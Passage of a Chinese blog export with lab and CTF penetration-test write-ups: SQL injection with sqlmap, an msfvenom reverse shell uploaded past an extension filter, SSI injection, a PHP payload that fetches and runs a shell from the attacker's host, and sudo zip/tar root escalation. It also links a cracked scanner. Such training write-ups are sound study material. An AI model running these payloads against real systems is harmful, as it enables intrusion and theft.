<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nc -nvv 192.168.0.1 80 //扫描 80端口</span></span><br><span class="line">(UNKNOWN) [192.168.0.1] 80 (?) open</span><br><span class="line">y  //用户输入</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，<code>nc</code>命令探测大端口的banner，获得两个flag：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p- -T4 192.168.1.115</span><br><span class="line">nc 192.168.1.115 13337</span><br><span class="line">nc 192.168.1.115 60000</span><br></pre></td></tr></table></figure>

<p><img src="/1055/1.PNG"></p>
<ol start="2">
<li><code>dirb</code>挖掘<code>9090</code>端口web信息：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb https://192.168.1.115:9090/</span><br></pre></td></tr></table></figure>

<p><img src="/1055/2.PNG"></p>
<ol start="3">
<li>访问<code>9090</code>端口的web服务，获得flag：</li>
</ol>
<p><img src="/1055/3.PNG"></p>
<ol start="4">
<li><code>dirb</code>挖掘<code>80</code>端口web信息，两个敏感信息：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.1.115/</span><br></pre></td></tr></table></figure>

<p><img src="/1055/4.PNG"></p>
<ol start="5">
<li>访问<code>/passwords</code>目录，找到两个文件：</li>
</ol>
<p><img src="/1055/5.PNG"></p>
<ol start="6">
<li>打开第一个flag文件：</li>
</ol>
<p><img src="/1055/6.PNG"></p>
<ol start="7">
<li>查看第二个网址源码，得到一个密码，留作备用：</li>
</ol>
<p><img src="/1055/7.PNG"></p>
<ol start="8">
<li>访问<code>robots.txt</code>文件，两个敏感目录：</li>
</ol>
<p><img src="/1055/15.PNG"></p>
<ol start="9">
<li>访问第一个<code>/cgi-bin/root_shell.cgi</code>，没有有用信息：</li>
</ol>
<p><img src="/1055/8.PNG"></p>
<ol start="10">
<li>访问第二个<code>/cgi-bin/tracertool.cgi</code>，发现是一个tracert工具，可以注入：</li>
</ol>
<p><img src="/1055/9.PNG"></p>
<ol start="11">
<li>使用<code>cat</code>命令探测用户组，发现靶机对<code>cat</code>命令进行了屏蔽：</li>
</ol>
<p><img src="/1055/10.PNG"></p>
<ol start="12">
<li>将<code>cat</code>换成<code>more</code>，成功拿到三个用户名，结合前面密码<strong>winter</strong>，猜测对应用户名<strong>Summer</strong>：</li>
</ol>
<p><img src="/1055/11.PNG"></p>
<ol start="13">
<li>第一步还扫到了21端口，直接访问ftp服务，查看是否可以匿名登录，拿到flag：</li>
</ol>
<p><img src="/1055/12.PNG"></p>
<ol start="14">
<li>ssh登录靶机，发现22口禁用，换用第一步扫到的22222端口，成功登录：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p 22222 Summer@192.168.1.115</span><br></pre></td></tr></table></figure>

<p><img src="/1055/13.PNG"></p>
<ol start="15">
<li>同样<code>more</code>代替<code>cat</code>，获取flag：</li>
</ol>
<p><img src="/1055/14.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://www.runoob.com/linux/linux-comm-nc.html">Linux nc命令 | 菜鸟教程</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>nmap</tag>
        <tag>dirb</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x06】SQL注入之get参数注入</title>
    <url>/1056/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，dirb挖掘敏感目录，使用owasp zap扫描可利用漏洞，用sqlmap进行get参数注入，获取用户名和口令，上传反弹shell，获得权限，拿到flag。</p>
<p>本篇使用工具owasp zap，sqlmap，metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u [“url”] --dbs <span class="comment">#获取数据库</span></span><br><span class="line">sqlmap -u [“url”] --current-user <span class="comment">#获取当前用户名称 ：</span></span><br><span class="line">sqlmap -u [“url”] --current-db <span class="comment">#获取当前数据库名称</span></span><br><span class="line">sqlmap -u [“url”] -D [‘数据库名’] --tables   <span class="comment">#列出表名 ： </span></span><br><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T[‘表名’] --columns <span class="comment">#列出字段 </span></span><br><span class="line">sqlmap -u [“url”] -D [‘数据库名’] -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump <span class="comment">#获取字段内容</span></span><br></pre></td></tr></table></figure>

<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># msfvenom生成php反弹shell</span></span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机port -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># msf开启监听</span></span><br><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP</span><br><span class="line">&gt;<span class="built_in">set</span> lport 攻击机port</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，<code>nc</code>命令探测大端口的banner，获得两个flag：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.116</span><br></pre></td></tr></table></figure>

<p><img src="/1056/1.PNG"></p>
<ol start="2">
<li><code>nikto</code>挖掘<code>80</code>端口web信息，找到登录页面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.116/</span><br></pre></td></tr></table></figure>

<p><img src="/1056/2.PNG"></p>
<ol start="3">
<li>访问登录页面，尝试弱口令<strong>admin</strong>登录失败：</li>
</ol>
<p><img src="/1056/3.PNG"></p>
<ol start="4">
<li>使用<code>owasp zap</code>扫描网站可利用漏洞，这里利用SQL高危漏洞：</li>
</ol>
<p><img src="/1056/4.PNG"></p>
<ol start="5">
<li>使用<code>sqlmap</code>扫描，可以看到多种get参数注入：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.116/cat.php?id=3&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1056/5.PNG"></p>
<ol start="6">
<li>查看数据库列表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.116/cat.php?id=3&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/1056/6.PNG"></p>
<ol start="7">
<li>查看<code>photoblog</code>数据库的表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.116/cat.php?id=3&quot;</span> -D photoblog --tables</span><br></pre></td></tr></table></figure>

<p><img src="/1056/7.PNG"></p>
<ol start="8">
<li>查看<code>users</code>表的字段：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.116/cat.php?id=3&quot;</span> -D photoblog -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure>

<p><img src="/1056/8.PNG"></p>
<ol start="9">
<li>查看<code>login</code>和<code>password</code>字段内容，得到口令密码：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.116/cat.php?id=3&quot;</span> -D photoblog -T <span class="built_in">users</span> -C login,password --dump</span><br></pre></td></tr></table></figure>

<p><img src="/1056/9.PNG"></p>
<ol start="10">
<li>使用口令密码登录后台，准备制作反弹shell来上传：</li>
</ol>
<p><img src="/1056/10.PNG"></p>
<ol start="11">
<li><code>msfvenom</code>制作php反弹shell，编辑掉前面的<code>/*</code>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=攻击机IP LPORT=攻击机port -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/1056/11.PNG"></p>
<ol start="12">
<li>网站上传失败，提示**NO PHP!!**：</li>
</ol>
<p><img src="/1056/12.PNG"></p>
<ol start="13">
<li>修改后缀php变成PHP，绕过检测，上传成功：</li>
</ol>
<p><img src="/1056/13.PNG"></p>
<p><img src="/1056/14.PNG"></p>
<ol start="14">
<li>msf设置监听参数：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload php/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 192.168.1.114</span><br></pre></td></tr></table></figure>

<p><img src="/1056/15.PNG"></p>
<ol start="15">
<li>msf开启监听，网站点击shell，靶机拿到shell，不过登录没有flag：</li>
</ol>
<p><img src="/1056/16.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
        <tag>owasp_zap</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x07】SQL注入之post参数注入</title>
    <url>/1057/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto挖掘敏感目录，使用burpsuite构建post请求的raw文件，用sqlmap进行post参数注入，获取用户名和口令，上传反弹shell，获得权限，拿到flag。</p>
<p>本篇使用工具burpsuite，sqlmap。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># batch可以自动补全询问</span></span><br><span class="line">sqlmap -r [post请求] --level [1~5] --risk [1~3] --dbs --dbms mysql --batch</span><br><span class="line">sqlmap -r [post请求] --level [1~5] --risk [1~3] -D [‘数据库名’]  --tables --batch</span><br><span class="line">sqlmap -r [post请求] --level [1~5] --risk [1~3] -D [‘数据库名’]  -T [‘表名’] --columns --batch</span><br><span class="line">sqlmap -r [post请求] --level [1~5] --risk [1~3] -D [‘数据库名’]  -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump --batch</span><br></pre></td></tr></table></figure>

<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 监听端口</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，两个web服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.117</span><br></pre></td></tr></table></figure>

<p><img src="/1057/1.PNG"></p>
<ol start="2">
<li><code>nikto</code>挖掘<code>80</code>、<code>8080</code>端口web信息，找到一个登录页面和一个敏感目录<code>/img/</code>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.117/</span><br><span class="line">nikto -host http://192.168.1.117:8080/</span><br></pre></td></tr></table></figure>

<p><img src="/1057/2.PNG"></p>
<p><img src="/1057/3.PNG"></p>
<ol start="3">
<li>访问登录页面，尝试弱口令<strong>admin</strong>登录失败，查看源码是post请求：</li>
</ol>
<p><img src="/1057/4.PNG"></p>
<ol start="4">
<li>访问<code>/img/</code>目录，没有敏感文件，但是有个<strong>wordpress.png</strong>，说明网站可能是wordpress搭建的：</li>
</ol>
<p><img src="/1057/5.PNG"></p>
<ol start="5">
<li>尝试访问<code>/wordpress/wp-login.php</code>成功找到登录界面，这个页面用dirb也能扫出来，不过有点慢，尝试弱口令<strong>admin</strong>登录同样失败：</li>
</ol>
<p><img src="/1057/6.PNG"></p>
<ol start="6">
<li>使用burpsuite，首先设置与浏览器的代理ip和端口一致：</li>
</ol>
<p><img src="/1057/7.PNG"></p>
<ol start="7">
<li>浏览器模拟一次登录，在burpsuite查看raw文件，保存下来给sqlmap用：</li>
</ol>
<p><img src="/1057/8.PNG"></p>
<ol start="8">
<li>sqlmap使用raw文件扫描，获取到数据库列表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1057/9.PNG"></p>
<ol start="9">
<li>查看敏感数据库，前面几个都是空的，最后的<code>wordpress8080</code>有用户表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.raw --level 5 --risk 3 -D wordpress8080 --tables --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1057/10.PNG"></p>
<ol start="10">
<li>查看<code>users</code>表的列：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.raw --level 5 --risk 3 -D wordpress8080 -T <span class="built_in">users</span> --cloumns --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1057/11.PNG"></p>
<ol start="11">
<li>查看<code>username</code>和<code>password</code>列的内容，得到用户密码：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -r post.raw --level 5 --risk 3 -D wordpress8080 -T <span class="built_in">users</span> -C username,password --dump --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1057/12.PNG"></p>
<ol start="12">
<li>制作web反弹shell，修改攻击机IP和端口：</li>
</ol>
<p><img src="/1057/13.PNG"></p>
<ol start="13">
<li>替换掉主题的404页面，开启监听，访问页面获得权限，优化shell界面并提权，提权密码是前面sqlmap探测到的：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -nlvp 4444</span><br><span class="line"></span><br><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1057/14.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>sqlmap</tag>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x08】SQL注入之X-Forwarded-For参数注入</title>
    <url>/1059/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto挖掘敏感目录，使用AWVS扫描网站可利用漏洞，最后使用sqlmap进行X-Forwarded-For参数注入，获得用户名和口令，登录网站后台。</p>
<p>本篇使用工具AWVS，sqlmap。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="AWVS"><a href="#AWVS" class="headerlink" title="AWVS"></a>AWVS</h2><p>AWVS13破解版的kali安装教程见：</p>
<p><a href="http://0verflow.cn/?p=1463">AWVS13破解版安装_kali</a></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># batch可以自动补全询问</span></span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> --dbs --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D [‘数据库名’]  --tables --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D [‘数据库名’]  -T [‘表名’] --columns --batch</span><br><span class="line">sqlmap -u <span class="string">&quot;url&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D [‘数据库名’]  -T [‘表名’] -C [‘字段名1,字段名2,…’] --dump --batch</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个web服务：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.117</span><br></pre></td></tr></table></figure>

<p><img src="/1059/1.PNG"></p>
<ol start="2">
<li><code>nikto</code>挖掘<code>80</code>端口web信息，找到一个登录页面：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nikto -host http://192.168.1.117/</span><br></pre></td></tr></table></figure>

<p><img src="/1059/2.PNG"></p>
<ol start="3">
<li>访问登录页面，尝试弱口令<strong>admin</strong>登录失败，另外这个页面在首页也有：</li>
</ol>
<p><img src="/1059/3.PNG"></p>
<ol start="4">
<li>使用AWVS，新建<strong>target</strong>为192.168.1.117：</li>
</ol>
<p><img src="/1059/4.PNG"></p>
<ol start="5">
<li>设置<strong>Report</strong>为<code>developer</code>，开始扫描：</li>
</ol>
<p><img src="/1059/5.PNG"></p>
<ol start="6">
<li>右下角有实时扫描，红色是高危漏洞：</li>
</ol>
<p><img src="/1059/6.PNG"></p>
<ol start="7">
<li>点进去可以看到详细信息：</li>
</ol>
<p><img src="/1059/7.PNG"></p>
<ol start="8">
<li>sqlmap使用X-Forwarded-For参数扫描，获取到数据库列表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.117/&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> --dbs --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1059/8.PNG"></p>
<ol start="9">
<li>查看敏感数据库<code>photoblog</code>的用户表：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.117/&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D photoblog --tables --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1059/9.PNG"></p>
<ol start="10">
<li>查看<code>users</code>表的列：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.117/&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D photoblog -T <span class="built_in">users</span> --cloumns --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1059/10.PNG"></p>
<ol start="11">
<li>查看<code>login</code>和<code>password</code>列的内容，得到用户密码：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.1.117/&quot;</span> --headers=<span class="string">&quot;X-Forwarded-For:*&quot;</span> -D photoblog -T <span class="built_in">users</span> -C <span class="string">&quot;login,password&quot;</span> --dump --batch</span><br></pre></td></tr></table></figure>

<p><img src="/1059/11.PNG"></p>
<ol start="12">
<li>利用用户名和密码可登录网站后台，因为没有开启ssh服务，所以不登录靶机。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="http://0verflow.cn/?p=1463">AWVS13破解版安装_kali_</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>sqlmap</tag>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x09】SSI漏洞注入</title>
    <url>/1060/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录，利用SSI漏洞进行代码注入，执行python反弹shell，使用metasploit监听，获得shell。</p>
<p>本篇使用工具metasploit。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="SSI"><a href="#SSI" class="headerlink" title="SSI"></a>SSI</h2><p>SSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。</p>
<p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p>
<p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p>
<h2 id="metasploit"><a href="#metasploit" class="headerlink" title="metasploit"></a>metasploit</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shell</span></span><br><span class="line">msfvenom -p python/meterpreter/reverse_tcp lhost=攻击机IP lport=攻击机端口 -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启监听</span></span><br><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> payload python/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 攻击机IP</span><br><span class="line">&gt;<span class="built_in">set</span> lport 攻击机端口</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个web服务，<code>nikto</code>挖掘<code>80</code>端口web信息：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.118</span><br><span class="line">nikto -host http://192.168.1.118/</span><br></pre></td></tr></table></figure>

<p><img src="/1060/1.PNG"></p>
<ol start="2">
<li>访问页面，<code>.shtml</code>的后缀可能有ssi漏洞可以利用：</li>
</ol>
<p><img src="/1060/2.PNG"></p>
<p><img src="/1060/3.PNG"></p>
<ol start="3">
<li>测试命令，大写<code>EXEC</code>绕过过滤：</li>
</ol>
<p><img src="/1060/4.PNG"></p>
<ol start="4">
<li>生成shell：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p python/meterpreter/reverse_tcp lhost=192.168.1.114 lport=4444 -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p><img src="/1060/5.PNG"></p>
<ol start="5">
<li>开启监听：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">&gt;use exploit/multi/handler</span><br><span class="line">&gt;<span class="built_in">set</span> patload python/meterpreter/reverse_tcp</span><br><span class="line">&gt;<span class="built_in">set</span> lhost 192.168.1.114</span><br><span class="line">&gt;run</span><br></pre></td></tr></table></figure>

<p><img src="/1060/6.PNG"></p>
<ol start="6">
<li>复制shell到apache根目录下，开启apache服务：</li>
</ol>
<p><img src="/1060/7.PNG"></p>
<ol start="7">
<li>网页SSI注入命令下载shell脚本：</li>
</ol>
<p><img src="/1060/8.PNG"></p>
<ol start="8">
<li>修改shell脚本权限，增加可执行权限：</li>
</ol>
<p><img src="/1060/9.PNG"></p>
<ol start="9">
<li>注入执行命令，msf获得反弹shell：</li>
</ol>
<p><img src="/1060/10.PNG"></p>
<ol start="10">
<li>官方教程说本机没有设置flag，不过权限不够也访问不了<code>/root</code>，尝试提权无从下手，太菜了，以后再回来看看。</li>
</ol>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
<li><a href="https://blog.csdn.net/qq_40657585/article/details/84260844">SSI注入漏洞</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>metasploit</tag>
        <tag>ssi</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全0x0a】目录遍历漏洞</title>
    <url>/1061/</url>
    <content><![CDATA[<p>51CTO的网课，本篇利用nmap搜索开放端口，nikto、dirb挖掘敏感目录找到后台登录界面，使用owasp_zap扫描出目录遍历漏洞，上传执行php反弹shell，获得低权shell，最后利用zip&#x2F;tar提权拿到root权限。</p>
<p>本篇使用工具owasp_zap。</p>
<span id="more"></span>

<h1 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h1><h2 id="zip提权"><a href="#zip提权" class="headerlink" title="zip提权"></a>zip提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo zip exploit.zip exploit -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br><span class="line"><span class="comment">#-T 表示测试exploit.zip的完整性</span></span><br><span class="line"><span class="comment"># --unzip-command 与-T 一起使用，可以指定自定义命令用于解压exploit.zip</span></span><br><span class="line"><span class="comment">#可以自定义用于解压exploit.zip的命令，自定义解压命令是以root权限执行的，指定为sh -c /bin/bash, 获取一个root权限的shell</span></span><br></pre></td></tr></table></figure>

<h2 id="tar提权"><a href="#tar提权" class="headerlink" title="tar提权"></a>tar提权</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=<span class="string">&quot;/bin/bash&quot;</span></span><br><span class="line"><span class="comment">#–checkpoint-action 选项是提权点，可以自定义需要执行的动作，指定为exec=/bin/bash，获取一个root权限的shell</span></span><br></pre></td></tr></table></figure>

<h1 id="渗透记录"><a href="#渗透记录" class="headerlink" title="渗透记录"></a>渗透记录</h1><ol>
<li>nmap扫描靶机IP地址开放端口，一个web服务，<code>dirb</code>挖掘<code>80</code>端口web信息：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.2.138</span><br><span class="line">dirb http://192.168.2.138/</span><br></pre></td></tr></table></figure>

<p><img src="/1061/1.PNG"></p>
<ol start="2">
<li>访问登录页面，尝试弱口令<strong>admin</strong>成功登录，里面有一个表有两个用户的MD5密码，在线解密了尝试登录ssh，但是失败了：</li>
</ol>
<p><img src="/1061/2.PNG"></p>
<ol start="3">
<li>上<code>owasp_zap</code>扫到了目录遍历漏洞：</li>
</ol>
<p><img src="/1061/3.PNG"></p>
<ol start="4">
<li>测试该目录，确实返回了相应信息：</li>
</ol>
<p><img src="/1061/4.PNG"></p>
<ol start="5">
<li>把目录改成后台看到的表的目录，成功返回了表的内容：</li>
</ol>
<p><img src="/1061/5.PNG"></p>
<ol start="6">
<li>新建一个表，插入一段下载反弹shell的TEXT：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cd /tmp;wget http://192.168.2.205:8000/shell.php; chmod +x shell.php;php shell.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1061/6.PNG"></p>
<ol start="7">
<li>编辑反弹shell，修改地址和端口，python开启简单http服务：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m <span class="string">&quot;SimpleHTTPServer&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1061/7.PNG"></p>
<ol start="8">
<li>开启nc监听，修改目录为反弹shell目录。获得低权shell：</li>
</ol>
<p><img src="/1061/8.PNG"></p>
<ol start="9">
<li><code>/home/zico</code>目录下有<code>wordpress</code>文件夹，一般里面的配置文件有数据库密码：</li>
</ol>
<p><img src="/1061/9.PNG"></p>
<ol start="10">
<li>可以尝试用配置文件里的数据库密码ssh远程登录：</li>
</ol>
<p><img src="/1061/10.PNG"></p>
<ol start="11">
<li>ssh登录成功，依旧低权，不过可以tar&#x2F;zip提权：</li>
</ol>
<p><img src="/1061/11.PNG"></p>
<ol start="12">
<li>zip&#x2F;tar提权，获得root权限：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo zip exploit.zip exploit -T --unzip-command=<span class="string">&quot;sh -c /bin/bash&quot;</span></span><br><span class="line"></span><br><span class="line">sudo tar cf /dev/null exploit --checkpoint=1 --checkpoint-action=<span class="built_in">exec</span>=<span class="string">&quot;/bin/bash&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/1061/12.PNG"></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1SJ411h7VW">2020发布 CTF基础入门&#x2F;CTF教程零基础 渗透测试&#x2F;web安全&#x2F;CTF夺旗【整套教程】</a></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
